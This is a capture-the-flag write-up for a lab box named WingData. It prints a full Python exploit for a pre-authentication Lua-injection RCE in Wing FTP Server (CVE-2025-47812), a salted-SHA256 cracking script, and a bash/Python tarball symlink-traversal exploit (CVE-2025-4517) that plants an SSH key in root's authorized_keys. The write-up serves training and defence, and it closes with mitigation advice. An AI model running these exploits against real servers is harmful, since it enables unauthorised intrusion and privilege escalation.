WingData Writeup

Author: atrox | Tags: Wing FTP, CVE-2025-47812, Lua RCE, MD5, SHA256, CVE-2025-4517, PATH_MAX, Symlink Traversal

Summary

WingData hosts a Wing FTP Server (v7.4.3) exposed via a virtual host. Anonymous login is enabled, which allows exploitation of CVE-2025-47812 — a pre-authentication RCE via null byte injection in the session Lua file. After gaining a foothold as wingftp, credentials for the user wacky are recovered from Wing FTP's configuration (MD5 admin hash) and its user database (salted SHA256 hashes). Privilege escalation to root is achieved by abusing a vulnerable Python backup script via a crafted tarball that exploits symlink traversal (CVE-2025-4517 / PATH_MAX overflow in os.path.realpath()).

Foothold — CVE-2025-47812 (Pre-Auth RCE via Null Byte Injection)

Vulnerability Overview

Wing FTP Server v7.4.3 persists session data as Lua scripts on disk, executed later via dofile("session_file"). A typical session file:

Session = {
  username = "user",
  ip = "1.2.3.4",
  homedir = "/home/user",
}

The flaw arises from a mismatch between C/C++ string handling (null-terminated) and Lua string processing (length-aware):

  • Validation layer: strlen sees "admin\0evil" as "admin" — null byte terminates the check.
  • File writer: Persists the raw buffer, including everything after \0.
  • Lua interpreter: dofile() executes everything after the null byte as Lua code.

This enables pre-authentication RCE by injecting arbitrary Lua code into the username field.

Exploit Script — wingexploit.py

#!/usr/bin/env python3
# CVE-2025-47812 - Wing FTP Server pre-auth RCE via null byte injection
# Usage: python3 wingexploit.py -u http://ftp.wingdata.htb -c "id" -v

import argparse
import requests

def exploit(base_url, command, verbose=False):
    login_url  = f"{base_url}/loginok.html"
    trigger_url = f"{base_url}/dir.html"

    # Null byte payload: inject Lua os.execute() after the null byte
    # anonymous\x00"]]..os.execute('COMMAND')..[["
    payload = 'anonymous\x00"]]..os.execute(\'' + command + '\')..[["'

    if verbose:
        print(f"[*] Testing target: {base_url}")
        print(f"[+] Sending POST request to {login_url} with command: '{command}' and username: 'anonymous'")

    # Step 1 – authenticate anonymously with poisoned username
    r = requests.post(login_url, data={"username": payload, "password": ""}, allow_redirects=False)
    uid = r.cookies.get("UID")

    if not uid:
        print("[-] Failed to get UID cookie")
        return

    if verbose:
        print(f"[+] UID extracted: {uid}")
        print(f"[+] Sending GET request to {trigger_url} with UID: {uid}")

    # Step 2 – trigger session file execution
    cookies = {"UID": uid}
    try:
        r2 = requests.get(trigger_url, cookies=cookies, timeout=10)
        print("\n--- Command Output ---")
        # Output is embedded in the response body
        for line in r2.text.splitlines():
            line = line.strip()
            if line and not line.startswith("<") and not line.startswith("//"):
                print(line)
        print("----------------------\n")
    except Exception as e:
        print(f"[-] Error sending GET request to {trigger_url}: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CVE-2025-47812 Wing FTP RCE")
    parser.add_argument("-u", "--url",     required=True, help="Base URL (e.g. http://ftp.wingdata.htb)")
    parser.add_argument("-c", "--command", required=True, help="Command to execute")
    parser.add_argument("-v", "--verbose", action="store_true")
    args = parser.parse_args()
    exploit(args.url, args.command, args.verbose)

Hash Cracking Script — crack.py

#!/usr/bin/env python3
# Crack Wing FTP salted SHA256 hashes
# Hash format: SHA256(password + "WingFTP")

import hashlib

SALT   = "WingFTP"
TARGET = "32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca"
WORDLIST = "/usr/share/wordlists/rockyou.txt"

with open(WORDLIST, "r", errors="ignore") as f:
    for line in f:
        pwd = line.strip()
        candidate = hashlib.sha256((pwd + SALT).encode()).hexdigest()
        if candidate == TARGET:
            print(f"[+] FOUND: {pwd}")
            break
    else:
        print("[-] Password not found in wordlist")

Privilege Escalation — CVE-2025-4517 (Tarfile Path Traversal via PATH_MAX Overflow)

Vulnerability Overview

A sudo rule allows wacky to run /opt/backup_clients/restore_backup_clients.py as root. This script extracts user-supplied tar archives into a staging directory and uses os.path.realpath() to verify that extracted paths remain within the staging area.

The flaw: If a symlink chain inside the tarball causes the resolved path to exceed PATH_MAX (~4096 bytes), os.path.realpath() returns a truncated result without raising an error. The sanitization check sees a safe-looking truncated path, but the actual filesystem extraction follows the full symlink chain — pointing outside the staging directory to arbitrary locations on disk.

Exploit Script — root.sh

#!/bin/bash
# CVE-2025-4517 - restore_backup_clients.py PATH_MAX tarfile traversal
# Injects our SSH public key into /root/.ssh/authorized_keys

# 0. Clean up any interfering Python modules
echo "[+] Cleaning up interfering files..."
rm -f /tmp/tarfile.py /tmp/sys.py /tmp/os.py /tmp/*.pyc
rm -rf /tmp/__pycache__
pkill -9 rootbash 2>/dev/null
rm -f /tmp/rootbash

# 1. Generate a temporary SSH keypair
echo "[+] Creating SSH key for root access..."
rm -f /tmp/rootkey /tmp/rootkey.pub
ssh-keygen -t ed25519 -f /tmp/rootkey -N "" -q
PUBKEY=$(cat /tmp/rootkey.pub)

# 2. Build the malicious tar archive
echo "[+] Building malicious tar archive..."
cd ~
python3 - << EOF
import tarfile, os, io

pubkey = b"$PUBKEY\n"

# Deep path: 16 components of 247 chars each  → total > PATH_MAX (4096)
comp  = "d" * 247
steps = "abcdefghijklmnop"   # 16 characters = 16 directory levels
path  = ""

with tarfile.open("/tmp/backup_2000.tar", "w") as tar:
    # Build deeply-nested real directories interleaved with symlinks
    for s in steps:
        d = tarfile.TarInfo(os.path.join(path, comp))
        d.type = tarfile.DIRTYPE
        tar.addfile(d)

        l = tarfile.TarInfo(os.path.join(path, s))
        l.type   = tarfile.SYMTYPE
        l.linkname = comp
        tar.addfile(l)
        path = os.path.join(path, comp)

    # Final deep symlink: points far enough up to escape the staging dir
    linkpath = os.path.join("/".join(steps), "l" * 254)
    final          = tarfile.TarInfo(linkpath)
    final.type     = tarfile.SYMTYPE
    final.linkname = "../" * len(steps)   # walk up past the staging root
    tar.addfile(final)

    # Escape symlink → resolves to /root through the traversal chain
    escape          = tarfile.TarInfo("escape")
    escape.type     = tarfile.SYMTYPE
    escape.linkname = linkpath + "/../../../../../../root"
    tar.addfile(escape)

    # Create .ssh directory through the escape symlink
    ssh_dir      = tarfile.TarInfo("escape/.ssh")
    ssh_dir.type = tarfile.DIRTYPE
    ssh_dir.mode = 0o700
    tar.addfile(ssh_dir)

    # Overwrite authorized_keys with our public key
    auth      = tarfile.TarInfo("escape/.ssh/authorized_keys")
    auth.size = len(pubkey)
    auth.mode = 0o600
    tar.addfile(auth, io.BytesIO(pubkey))

print("[+] Malicious tar created successfully")
EOF

# 3. Drop the payload in the watched backups directory
echo "[+] Copying to backups directory..."
cp /tmp/backup_2000.tar /opt/backup_clients/backups/

# 4. Trigger the vulnerable restore script as root
echo "[+] Triggering extraction as root..."
sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py \
  -b backup_2000.tar -r restore_final

echo "[+] Waiting for extraction to complete..."
sleep 2

# 5. SSH in as root using the injected key
echo "[+] Connecting as root..."
ssh -i /tmp/rootkey -o StrictHostKeyChecking=no root@localhost \
  "id; echo 'Root shell obtained'; cat /root/root.txt"

Key Takeaways

  • Null byte injection is a classic but often overlooked attack when C string functions and interpreted languages (Lua, PHP, etc.) are mixed in the same code path.
  • Custom hash schemes like SHA256(password + "WingFTP") are trivially crackable once the salt is known — proper KDFs (bcrypt, argon2) are essential.
  • os.path.realpath() is not a security boundary when inputs can exceed PATH_MAX. Always validate paths after extraction and use Python's tarfile safe extraction mode (filter='data', available since Python 3.12).
